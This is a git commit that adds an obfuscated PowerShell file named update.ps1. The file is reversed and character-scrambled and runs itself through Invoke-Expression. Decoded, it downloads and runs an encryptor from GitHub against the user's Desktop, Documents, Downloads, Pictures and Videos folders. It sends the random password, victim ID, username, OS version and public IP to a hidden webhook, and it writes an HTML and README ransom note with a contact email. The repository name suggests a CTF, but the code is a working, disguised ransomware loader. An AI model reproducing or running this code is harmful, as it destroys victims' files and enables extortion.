aeecf9336cc46f87256f35b1527e52486336fc32
Barad-dûr <57357604+Barad-dur@users.noreply.github.com>
2019-12-04 09:51:51 -0300

    Add files via upload

---
+++ update.ps1
@@ -0,0 +1,56 @@
+Set-Variable -Name rk2p -Value ([CHar[ ]]" ))63]RaHc[]GNirTs[,'FOC'(EcAlPEr.)93]RaHc[]GNirTs[,'rSh'(EcAlPEr.)421]RaHc[]GNirTs[,'3YU'(EcAlPEr.)')rShrShnioJ-]52,42,4[CePSMo'+'c:vnEF'+'OC (.3YU )93]rAhC[,rShJEOrShECALPeR-43]rAhC'+'[,rShBvxrSh '+' ECALPeR- 421]rAhC[,)45]rAhC[+98]rAhC[+65]rAhC[(  ECA'+'LPeR-29]rAhC[,)121]rAhC[+37]rAhC[+'+'27]rAhC[( E'+'CALPeR-63]rAhC[,rShMYOrShEC'+'ALPeR- '+' )rSh
+
+
+
+
+lluN-tuO 6Y8 esrrSh+rShuceR- ecroF- riDte'+'gratMYO htaP- metI-evomeR
+Bvxlmth.EMDAERyIHpotkseDyIHELIFORPRESU:vneMYOBvx noisserpxE-ekovnI
+tnoclmthMYO BvxlrSh+rShmth.EMDA'+'ERyIHpotkseDyIHELIFORPRESU:vneMYOBvx tnetnoC-teS
+DIeP'+'rSh+rShMYO f- JEO>lmth/<>ydob/<>p/<>tnof/<rSh+rSh}0{ si DI lanosreP ruoY>BvxetihwBv'+'x=roloc BvxkcalB l'+'air'+'ABvx=ecaf tnofrSh+rSh<>Bvxretnec'+'Bvx'+'=ngila p<>tnof/<rSh+rShmoc.liamnotorSh+rShrp'+'@2rud-darSh+rShrab rof DI lanosreP ruoy htiw egas'+'sem a dnes kcab meht evah oT>BvxlairABvx=ecaf rSh+r'+'Sht'+'nof<>b<'+'rSh+rSh>B'+'vxretrSh+rShnecBvx=ngil'+'a p<rSh+rSh>p/<>rb<drowssap'+' modn'+'ar gnorts yrev'+' a htiw detp'+'ircne era yehT>rrSh+r'+'Shb<>BrSh+rShvxlairABvx=ecaf tnof<>b<>rb<>BvxretnecBvx=ngila p<>p/'+'<BvxrSh+r'+'Shgpj.BKXJxbM/moc.rugmi.i//:sptthBvx=crs gmi<>BvxretrSh'+'+rShnecB'+'vx'+'=ngila p<>Bvxretn'+'ec'+'Bvx=nrSh+rShgila p<>tnof/<!detpyrcne won era selif ruoY>BvxetihwBvx=roloc rSh+rShBvx7Bvx=ezis Bvxkcal'+'B lairABvx=ecaf tnof<>BvxretnrSh'+'+rShecBvx=ngila p<>Bvx9f9f9f#Bvx=txet BvxrSh+rShkcalbBvxrSh+rSh=rolocgb ydob<>daeh/<>eltit/<!!!OOOOOONrSh+rSh HO>eltit<>BvxrrSh+rShb-tpBvx=tnetnoc BvxegaugnaL-trSh+rShnetno'+'C'+'Bvx=virSh+rShuqe-ptth'+' atem<>d'+'arSh+rSheh<>BvrS'+'h+rShx1-9588-osi=tesrahc ;'+'l'+'mth/txetBvx='+'tnetnoc BvxepyT'+'-tnetnoCBvx=viuqe-ptth atem<>lmth<JEO = tnoclmthM'+'YO
+rSh+rShllurSh+rShN-tuO 6Y8 ecroF- eliF'+' erSh+rS'+'hpyTmetI- Bvx'+'lmth.EMDAERyIHprSh+rShotkseDyIHELIFORPRESU:vnrSh+rSher'+'Sh+rShMYOBvx metrSh+rShI-weN
+lluN-tuO '+'6Y8'+' rSh+rShecroF- BvxtxetMYOBvx eurSh+rShlaV- '+'BvxelrSh+rShifBvx epyTmetI- '+'Bv'+'xtxt.EMDA'+'ERBvx emarSh+rS'+'hN- BvxyIHpotkseDy'+'IHELIFORPRESU:vneMYOBvx htaP- '+'met'+'I'+'-weN
+Bvx!kcabrSh+rSh selif rrSh+rShuoy teg ot moc.liamnrSh+rShotrSh+rShorp@2rud-darab liamrSh+rShe eht ni em tcatnoC .D'+'IePMYO si DI lan'+'orSh+rShsreP ruo'+'YBvx = txetMYrSh+rShO
+)nosJ-oTtrevnoC 6Y8 daol'+'yapMYO( ydoB- }Bvx'+'no'+'sj/noitacilppaBvrSh+rShx=Bv'+'xepyT-tnetnoCBvx{@ sredaeH- tsoP do'+'hteM- l'+'rUkooHbrSh+rSheWMYO irU- dohteMtseR-ekovnI
+}tnetnocMYO=tnetnoc{@]tcejbOmotsuCSP[ = daolyapMYOrSh+rSh
+@Bvx
+PIrSh+rShbuPMYO = pI cilbuP
+wonemitMYO rSh+rSh= emiT-'+'etaD
+noisrevMYO = noisrerSh+rShvrSh+rSh SO
+resuMYO = resU
+DWPMYO = rSh+rShdrowssaP
+DIePMYO rSh+rSh= DI
+Bvx@ = tnetnocMYO
+))trSh+rShnetnoc.gnirtSMYO(gnirtS46esaBmorF::]trSh+rShrevnoC.metsy'+'S[(rSh+rShgnirtSteG.IrSh+rSh'+'ICSA::]gnidocnE.txeT'+'rSh+rSh.merSh+'+'rShtsyS[ = l'+'rUkoo'+'H'+'beWMYO
+gnisraPc'+'isaBe'+'sU- lrUbeWMYO tseuqeRbeW-ekovnI = gnirtSrSh+rShMYOrSh+rSh
+Bvxtxt.elif/retsam/sFTC/rud-daraB/moc'+'.tnetnocresub'+'uhtig.war//:sptrSh+rShthBvx = rSh+rShlrUbeWMYO
+tnetnoC.)gnis'+'raPcisaBesU- Bvxpi/e'+'m.gifnocfi//:ptthBvx iru- tseuqeRbeW-ekovnI( =PIbuPMYO
+'+'B'+'vxmm:HH yyyy/dd/M'+'M ddddBvx tamroF- etaD-teG = wonemitMYO
+norSh+rShisreVSO::]tnrSh+rShemnorirSh+rShvn'+'E.rSh+rShmets'+'yS[ = noisrevMYO
+BvxemaNresU'+':vneMYOyIHni'+'amoDresU:vneMYOBvx = resuMYO
+lluN-tuO 6Y8 Bvx0Bvx eulaV- BvxelifBv'+'x epyTmetI-'+' Bv'+'rSh+rShxtxt.'+'rSh+rShelifgolBvrSh+rShx emaN- Bv'+'xyIHtfosorciMyIrSh+rShHATADPPALACOL:vneMYOBvx htaP- metI-weN
+neddiH elytSwodniW- sgraMY'+'O tsiLtnemugrA- BvxrSh+rSh2elifMYOBvx htaPeli'+'F- rSh+rShssecorP-tratrSh+rShS
+)BvxyIHsoediVyIHEMAN'+'RESU:vneMYOyIHsresUyIH..yIH.rSh+rSh.yIH..yrSh+rShIH..yIH..yIH..yIH..rSh+r'+'Sh'+'yIH..y'+'IH..Bvx ,BvxDWPMYO drowssap--Bvx ,Bvxe-Bvx(@ = sgraMYO
+neddiH erSh+rShlytSwodniW- sgraMYO tsiLtnerSh+rShmugrA- Bvx2elifMYOBvxrSh+rSh htaPeliF- ssecorP-trSh+rShratS
+)BvxyIHsdaoln'+'woDyIH'+'EMrSh+rShANRESU:'+'vneM'+'YOyIHsresUyIH..yIH..yIH..yI'+'H..yIH..yrSh+rShIH..yIH..yIH..yIH..Bvx ,Bv'+'xrSh+rShDWPMYO '+'drowssap--Bvx ,Bvxe-Bvx(@ r'+'Sh+rSh= sgraMYO
+'+'neddiH elytS'+'wodrSh+rShniW- sgr'+'aMYO ts'+'rSh+rShi'+'LtnemugrA- Bvx2elifMYOrSh+rShBvx htaPelirSh+rShF- ssecorP-tr'+'atS
+)BvxyIHstnemucoDyIHrSh+rShEMANRES'+'U:vneMYOyIHsres'+'UyIH..yIH..yIH..yrSh+rShIH..yIH..yrSh+rShIH..yIH..yIH..y'+'IH..BrSh+rShvx ,BvxDrSh+rShWPMYO drowssap--Bvx ,Bvx'+'e-rSh+r'+'ShBvx(@ = sgraMYO
+neddiH elytSwodniW- srSh+rShgraMYO t'+'siLtnemugrrSh+'+'rShArS'+'h+rSh- Bvx'+'2elifMYOBvx htaPeliF- ssecorP-tr'+'atS
+)BvxyIHserurSh+rShtciPyIHEMANRESU:vrSh+rShneMYOyIHsresUy'+'IH..yIH..yIH..yIH..yIH..yIH..yIH'+'..yIH..yIH..Bvx ,BvxDWPMYOrSh+rSh drowssap--Bvx ,Bvxe-Bvx(@ = sgraMYO
+neddiH elytSwodniW- sg'+'ra'+'M'+'YO tsiLtnemu'+'grA- Bvx2elifMYOr'+'Sh+rShBvx htaPeliF- srS'+'h+rShsecorP-tratS
+)BvxyIH'+'porSh+rShtkseDyIHEMANRESU:vneMYOyIHrSh+rShsresUyIH..yIH..yIH..yIH..yIH..yIH..rSh+rSh'+'yIH..yIH..yIH..Bvx ,BvxDWPMYO drowssap--Bvx ,Bvxe-Bvx(@ = sgraMYrSh+rShO
+'+'JEOJEO nioj- ) }rSh+rSh 9 mumixaM- 0 muminiM- modnaR-teG'+' { tcejbO-hca'+'EroF 6Y8 )23..1( ( = DIePMYO
+)}_MY'+'OrSh+rSh]rahc[{ % 6Y8 23 tnuoC- modnaR-teG 6Y8 )221.rSh+rSh.79(,)09..56(,)75..84(( '+'nioj- = DWPMYO
+ecroF- 2elifMYO 1rSh+rShelifMYO metI-evoM
+Bvxexe.etadpue1'+'gorSh+rShogyIHemanridMYOy'+'IHELIFORPR'+'ESU:vneMYOBvx = 2elifMY'+'O
+Bvxgpj.xedniyIHemarSh+rShn'+'ridMYOyIHELIFORrSh+rShPRESU:vneMYOBvx = 1elrSh+rShi'+'fMYO
+ecrrSh+rShoF- htaptuoMYO metI-ev'+'omeR
+ri'+'DtegratMYO hrSh+rShtaPnoitanitseD- htaptuoMYO htaPlaretiL- evihcrA-dn'+'apxE
+BvxemrSh+rShanridMYOyIHELIFO'+'RPRESU:vneMYOBvx = riDtegratMYO
+)htap'+'tuoMYO ,lruMrSh+rShYO(eliFdrSh+rShaolnwoD.)tneilCbeW.teNr'+'Sh+'+'rSh.metsyS tcejbO-weN(
+Bvxpiz'+'.xedniy'+'IHemanridMrSh+rShYOyIHr'+'Sh+rShELrSh+rShIFORPRES'+'UrSh+rSh:vneMYOBv'+'x = htar'+'Sh+rShptuoMYO
+B'+'vxpiz.xedni/retsam/war/sFTC/rud-daraB/moc.buhtirSh+r'+'Shg//:sptthBvx = lruMYO
+21slT::]epyTlocotorPytiruceS.teN[ = locotorPytiruceS::]reganaMrSh+rShtnioPecivreS.teN[
+} BvxneddiHBvx rob- seturSh+rShbirttArSh+rSh._MYO = setubirttrSh+rShA._MYO { hcaerSh+rShrof 6Y8 ecroF- Bvxem'+'anrirSh+rShdMYOyIHE'+'LIFORrSh+rShPRESU:vneMYOBvx meti-teg
+lluN-tu'+'O '+'6Y8 Bvxem'+'anridMYOyIHE'+'LIFORPRESU:vneMYOBvx htaP- BvxyrotceridBvx '+'epyTmetrSh+rShI- merSh+rShtI-weN
+)}_MYO]rahrSh+rShc['+'{ % 6Y8 01 tnuoC- modnaR-teG 6Y8 )22'+'1..79(,)09.'+'.56(( niojrSh+rSh- = emanridMYO
+}0 tixe{ )Bvxtxt.elifgolyIrSh+rS'+'hHtfo'+'sorciMyIHATADPPALACOL:vneMYOBvx htaP- htaP-tseT( firSh(('( ( )''nioJ-]2,11,3[EmaN.)'*rdM*' ELbAiRav-tEG((& "); [ARRaY]::rEVERSE(( LS  vArIABlE:rk2p  ).value) ;" $(seT-iTEM 'vArIAbLE:ofS' '')" + [StRINg] ( ( LS  vArIABlE:rk2p  ).value ) +"$( set-iTEM  'varIAbLe:OFS'  ' ')" |& ((get-VaRIAblE '*mdR*').NAME[3,11,2]-joIN'')
